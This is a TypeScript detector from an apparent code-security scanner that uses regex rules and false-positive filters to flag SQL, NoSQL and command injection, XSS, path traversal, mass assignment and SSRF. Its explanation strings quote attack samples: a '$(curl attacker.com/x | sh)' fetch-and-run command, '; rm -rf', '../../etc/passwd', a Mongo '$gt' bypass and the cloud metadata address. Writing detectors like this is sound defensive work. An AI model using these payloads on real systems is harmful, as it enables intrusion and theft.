import { readFile } from "node:fs/promises";
import { randomUUID } from "node:crypto";
import type { ConfidenceLevel, Domain, Finding } from "@verglos/shared";
import type { ScannedFile } from "../walker.js";
import { isMetadataKeyLine } from "../context.js";
import type { Detector } from "./types.js";

interface InjectionPattern {
  name: string;
  rule: string;
  domain: Domain;
  pattern: RegExp;
  severity: Finding["severity"];
  description: string;
  why: string;
  fix: string;
}

const INJECTION_PATTERNS: InjectionPattern[] = [
  {
    name: "SQL injection (string concat)",
    rule: "D1-001",
    domain: "D1",
    pattern: /(?:query|execute)\s*\(\s*[`'"].*?\$\{/i,
    severity: "critical",
    description: "SQL query built with string interpolation may allow SQL injection.",
    why: "String-interpolated queries let user input become part of the SQL grammar. That's every SQL-injection tutorial ever, and it still ends companies.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
  },
  {
    name: "SQL injection (concatenation)",
    rule: "D1-002",
    domain: "D1",
    pattern: /(?:query|execute)\s*\(\s*[^)]*\+/i,
    severity: "critical",
    description: "SQL query built with concatenation may allow SQL injection.",
    why: "Concatenating user input into SQL is identical to string interpolation — the driver has no way to know where the query ends and the data begins.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
  },
  {
    name: "Command injection (exec)",
    rule: "D1-003",
    domain: "D1",
    // Only flag when the exec-line contains a clearly user-input-shaped
    // token (req./params./body./query./searchParams/formData/userInput).
    // Bare `${...}` interpolation is not enough — that catches
    // `execSync(\`git log ${sha}\`)` where sha is trusted internal state.
    pattern: /(?:exec|execSync|spawn|spawnSync)\s*\(\s*[^)]*(?:req\.|request\.|params\.|body\.|query\.|searchParams|formData|\buserInput\b)/i,
    severity: "critical",
    description: "Shell command executed with user-controlled input.",
    why: "Shelling out with user input gives an attacker your process's shell. A single `; rm -rf` or `$(curl attacker.com/x | sh)` is often enough.",
    fix: "Avoid shell execution with user input. Use allowlists and sanitize inputs.",
  },
  {
    name: "XSS (dangerouslySetInnerHTML)",
    rule: "D1-004",
    domain: "D1",
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html:\s*[^}]*(?:req\.|params\.|body\.|\$\{)/i,
    severity: "high",
    description: "dangerouslySetInnerHTML with dynamic content can lead to XSS.",
    why: "React's dangerouslySetInnerHTML bypasses its normal escaping. Any user-controlled string that reaches it can inject scripts into your users' sessions.",
    fix: "Sanitize HTML with DOMPurify before rendering.",
  },
  {
    name: "NoSQL injection",
    rule: "D1-005",
    domain: "D1",
    pattern: /\{\s*\$gt\s*:\s*['"]{2}\s*\}/i,
    severity: "critical",
    description: "NoSQL injection pattern detected ($gt bypass).",
    why: "The `{$gt: \"\"}` shape bypasses Mongo authentication when user JSON is passed straight into a query — every stored user matches.",
    fix: "Validate and sanitize all user input before database queries.",
  },
  {
    name: "Path traversal",
    rule: "D1-006",
    domain: "D1",
    // Same reasoning as D1-003: bare `${...}` catches every
    // `readFile(\`${projectRoot}/config.json\`)` in real code. Require
    // an explicit user-input token to keep precision high.
    pattern: /(?:readFile|readFileSync|createReadStream)\s*\(\s*[^)]*(?:req\.|request\.|params\.|body\.|query\.|searchParams|formData|\buserInput\b)/i,
    severity: "high",
    description: "File read with user-controlled path may allow path traversal.",
    why: "A path like `../../etc/passwd` walks out of the intended directory. If any user input reaches a file read without allowlist checking, arbitrary file disclosure follows.",
    fix: "Validate paths against an allowlist. Use path.resolve and check prefix.",
  },
  {
    name: "Mass assignment",
    rule: "D3-001",
    domain: "D3",
    pattern: /\.create\s*\(\s*req\.body\s*\)|\.update\s*\(\s*req\.body\s*\)/i,
    severity: "high",
    description: "Passing req.body directly to model creation allows mass assignment.",
    why: "Spreading req.body lets a user set fields you never intended to expose — `isAdmin`, `stripe_customer_id`, `email_verified`. Models trained on tutorials write this pattern by default.",
    fix: "Explicitly pick allowed fields instead of spreading req.body.",
  },
  {
    name: "SSRF (user-controlled fetch)",
    rule: "D9-002",
    domain: "D9",
    pattern: /fetch\s*\(\s*(?:req\.|params\.|body\.|\$\{)/i,
    severity: "high",
    description: "Fetching a user-supplied URL may allow SSRF attacks.",
    why: "A server-side fetch on a user URL can hit the cloud metadata endpoint (169.254.169.254) and leak IAM credentials, or reach internal services no external attacker could touch.",
    fix: "Validate URLs against an allowlist. Block internal IP ranges.",
  },
];

const USER_CONTROLLED_HTML =
  /req\.body|req\.params|req\.query|userInput|formData|event\.target\.value|params\.|searchParams|location\.hash|location\.search/i;

/**
 * D1-001 noise filters. Both derived from the Phase-0 corpus analysis
 * across 87 open-source repos: 295 of 599 surviving D1-001 crits were
 * pure DDL (DROP/ALTER/CREATE/TRUNCATE) where interpolation is only ever
 * an identifier; another ~200 were non-SQL calls that happened to match
 * because the pattern looks for `.query(` anywhere.
 */

// Non-SQL uses of `.query(` — React, GraphQL, MUI, styled-components.
// Interpolating into these has nothing to do with SQL.
const NON_SQL_TEMPLATE_TAGS = new RegExp(
  String.raw`\b(useMediaQuery|useQuery|useSuspenseQuery|useInfiniteQuery|useMutation|useTemplate|graphql|gql|styled|css|sql\.js\.|window\.matchMedia)\b`,
  "i",
);

// SQL verbs where the interpolated `${...}` is unavoidably an identifier
// (schema name, table name, index name, channel name). No amount of
// parameterization can bind an identifier — even in production, the code
// legitimately builds these from constants. Also covers transaction-
// control (SAVEPOINT/RELEASE) and SQLite PRAGMA/ATTACH which take
// identifiers or filenames, not user data.
const IDENTIFIER_ONLY_VERBS = new Set([
  "DROP", "CREATE", "ALTER", "TRUNCATE", "LISTEN", "UNLISTEN", "USE",
  "GRANT", "REVOKE", "COMMENT", "BEGIN", "COMMIT", "ROLLBACK",
  "SET", "SHOW", "EXPLAIN", "VACUUM", "ANALYZE", "REINDEX",
  "BACKUP", "RESTORE", "SAVEPOINT", "RELEASE", "PRAGMA",
  "ATTACH", "DETACH",
]);

// Pull the first uppercase-word after `query(` or `execute(` and its
// opening quote. Returns null when the shape doesn't match a real call.
function firstSqlKeyword(line: string): string | null {
  const match = line.match(
    /(?:query|execute)\s*\(\s*[`'"]\s*([A-Za-z_]+)\b/i,
  );
  return match?.[1] ? match[1].toUpperCase() : null;
}

// Real SQL calls look like `client.query(`, `db.execute(`, `await
// queryRunner.query(`, `pool.query(` — always a MEMBER call. Bare
// `QUERY("${name}")` in a spreadsheet formula or a label field is not
// a SQL call, even though our loose regex thinks it is.
const IS_MEMBER_SQL_CALL = /(?:\.|\bawait\s+)\s*(?:query|execute)\s*\(/i;

/**
 * D1-003 noise filter — distinguish RegExp.prototype.exec from
 * child_process.exec. The command-injection pattern matches any
 * `.exec(...)` call whose argument reads user input, but a regex's
 * .exec has the same shape and running a regex over user input is
 * safe by definition.
 *
 * Returns true when the receiver of `.exec(` is clearly a regex.
 * Signals: regex literal directly before `.exec(`, ALL_CAPS_CONST
 * receiver (typical for pre-compiled regex constants), or mixed-
 * case name ending in Regex / Pattern / Match / Re / _RE / _REGEX
 * / _PATTERN.
 */
const REGEX_LITERAL_EXEC = /\/[^/\n]+\/[gimsuy]*\.exec\s*\(/;
const CAPS_CONST_EXEC = /(?:^|[^A-Za-z0-9_$])([A-Z][A-Z0-9_]{2,})\.exec\s*\(/;
const REGEX_NAMED_EXEC =
  /(?:^|[^A-Za-z0-9_$])[A-Za-z_$][A-Za-z0-9_$]*(?:Regex|RegExp|Pattern|Match|Re)\.exec\s*\(|(?:^|[^A-Za-z0-9_$])\w+_(?:RE|REGEX|PATTERN)\.exec\s*\(/;

function looksLikeRegexExec(line: string): boolean {
  if (REGEX_LITERAL_EXEC.test(line)) return true;
  if (CAPS_CONST_EXEC.test(line)) return true;
  if (REGEX_NAMED_EXEC.test(line)) return true;
  return false;
}

// `.execute(` on a receiver whose name is a sandbox / shell / vm /
// child_process / cmd object is running a shell command, not SQL.
// The command-injection detector (D1-003) handles shell exec safely;
// firing D1-001 for it double-flags and confuses reports.
const SHELL_EXECUTE_RECEIVER =
  /\b(sandbox|shell|vm|child|childProcess|process|proc|cmd|command|worker|runner|executor|newSandbox)\.execute\s*\(/i;

// If the interpolated content is a shellQuote() / sqlIdentifier() /
// escapeIdentifier() call, the developer is explicitly escaping. Not
// user-controlled injection.
const EXPLICITLY_ESCAPED =
  /\$\{\s*(?:shellQuote|escapeShellArg|shellescape|escapeIdentifier|sqlIdentifier|escape|escapeSql|sanitize)\s*\(/i;

// If the SET/VALUES/WHERE clause uses ? or $N placeholders in the
// same template, the query IS parameterized — the interpolated
// portion is a column/table identifier from controlled state, not
// user data. `db.query(\`UPDATE t SET ${cols} WHERE id = ?\`)` is
// safe when `?` is bound by the caller.
const PARAMETERIZED_PLACEHOLDER =
  /=\s*\?|\bVALUES\s*\(\s*\?|\?\s*[,)]|=\s*\$\d+|VALUES\s*\(\s*\$\d+/i;

function shouldSkipSqlInjection(line: string): boolean {
  if (NON_SQL_TEMPLATE_TAGS.test(line)) return true;

  const keyword = firstSqlKeyword(line);
  if (keyword && IDENTIFIER_ONLY_VERBS.has(keyword)) return true;

  // Non-member-call: `label: \`QUERY("${queryName}")\`` and similar
  // formula strings. The regex only fires because the letters
  // q-u-e-r-y appear followed by an open-paren — that isn't a db call.
  if (!IS_MEMBER_SQL_CALL.test(line)) return true;

  // sandbox.execute(...) / shell.execute(...) — shell command, not SQL.
  if (SHELL_EXECUTE_RECEIVER.test(line)) return true;

  // Interpolation is already escaped by shellQuote/escapeIdentifier/etc.
  if (EXPLICITLY_ESCAPED.test(line)) return true;

  // Parameterized: has ? or $N placeholders alongside the ${} — the
  // interpolated bit is safe (column/table name); the value is bound.
  if (PARAMETERIZED_PLACEHOLDER.test(line)) return true;

  return false;
}

function previousContext(lines: string[], index: number, radius: number): string {
  return lines.slice(Math.max(0, index - radius), index + 1).join("\n");
}

function nearbyStaticIconAssignment(lines: string[], index: number): boolean {
  const line = lines[index] ?? "";
  const assignedVariable = line.match(/\.innerHTML\s*=\s*([A-Za-z_$][\w$]*)/)?.[1];
  if (!assignedVariable || !/icon/i.test(assignedVariable)) return false;

  const preceding = lines.slice(Math.max(0, index - 100), index).join("\n");
  const declaration = new RegExp(
    `(?:const|let|var)\\s+${assignedVariable}\\s*=\\s*\`[\\s\\S]*\\$\\{\\s*Icon[A-Za-z0-9_$]*\\s*\\}[\\s\\S]*?\``,
  );
  return declaration.test(preceding);
}

function classifyInnerHtml(lines: string[], index: number): {
  severity: Finding["severity"];
  description: string;
  confidence: ConfidenceLevel;
} {
  const context = previousContext(lines, index, 3);
  const line = lines[index] ?? "";

  if (USER_CONTROLLED_HTML.test(context)) {
    return {
      severity: "high",
      description: "innerHTML is assigned from user-controlled input, which can lead to XSS.",
      confidence: "high",
    };
  }

  if (/`[^`]*\$\{[^}]+\}[^`]*`/.test(line) && !USER_CONTROLLED_HTML.test(line)) {
    return {
      severity: "low",
      description:
        "innerHTML is assigned from a template literal without obvious user-controlled input. Review interpolated values, but this is lower risk when values are imported constants, icons, or static strings.",
      confidence: "high",
    };
  }

  if (nearbyStaticIconAssignment(lines, index)) {
    return {
      severity: "low",
      description:
        "innerHTML is assigned from a local icon template using imported static SVG content. Review if the icon source changes, but this is lower risk than user-controlled HTML.",
      confidence: "high",
    };
  }

  return {
    severity: "medium",
    description:
      "innerHTML is assigned from a variable or expression whose origin is unclear. Verify it cannot contain user-controlled HTML.",
    confidence: "medium",
  };
}

export const injectionDetector: Detector = {
  id: "injection",
  async run(files: ScannedFile[]): Promise<Finding[]> {
    const findings: Finding[] = [];
    const seen = new Set<string>();

    for (const file of files) {
      if (!/\.(js|jsx|ts|tsx|mjs|cjs)$/.test(file.relativePath)) continue;

      let content: string;
      try {
        content = await readFile(file.path, "utf8");
      } catch {
        continue;
      }

      const lines = content.split("\n");

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i] ?? "";
        if (isMetadataKeyLine(line)) continue;

        if (/\.innerHTML\s*=/.test(line)) {
          const key = `${file.relativePath}:${i}:XSS (innerHTML)`;
          if (!seen.has(key)) {
            seen.add(key);
            const classified = classifyInnerHtml(lines, i);

            findings.push({
              id: randomUUID(),
              detector: "injection",
              rule: "D1-007",
              domain: "D1",
              severity: classified.severity,
              title: "XSS (innerHTML)",
              description: classified.description,
              why: "innerHTML parses its input as HTML — scripts, event handlers, iframes. If any user-controlled string reaches it unsanitized, XSS follows.",
              file: file.relativePath,
              line: i + 1,
              snippet: line.trim().slice(0, 120),
              fix: "Use textContent for plain text, or sanitize trusted HTML with DOMPurify.",
              confidence: classified.confidence,
              category: "Input Validation & Injection",
            });
          }
        }

        for (const pattern of INJECTION_PATTERNS) {
          if (pattern.pattern.test(line)) {
            // D1-001 / D1-002 noise filters — DDL identifiers, non-SQL
            // template tags, and calls that aren't member-access shaped.
            // Concrete false positive killed by adding D1-002 to this:
            // English strings containing the word "query" followed by
            // "(" and a "+" (string concat operator) — e.g. PostHog
            // frontend/src/scenes/web-analytics/WebAnalyticsFilters.tsx.
            if (
              (pattern.rule === "D1-001" || pattern.rule === "D1-002") &&
              shouldSkipSqlInjection(line)
            ) {
              continue;
            }
            // D1-003 noise filter — regex.exec masquerading as
            // child_process.exec. See looksLikeRegexExec above.
            if (pattern.rule === "D1-003" && looksLikeRegexExec(line)) {
              continue;
            }
            const key = `${file.relativePath}:${i}:${pattern.name}`;
            if (seen.has(key)) continue;
            seen.add(key);

            findings.push({
              id: randomUUID(),
              detector: "injection",
              rule: pattern.rule,
              domain: pattern.domain,
              severity: pattern.severity,
              title: pattern.name,
              description: pattern.description,
              why: pattern.why,
              file: file.relativePath,
              line: i + 1,
              snippet: line.trim().slice(0, 120),
              fix: pattern.fix,
              confidence: "high",
              category: "Input Validation & Injection",
            });
          }
        }
      }
    }

    return findings;
  },
};
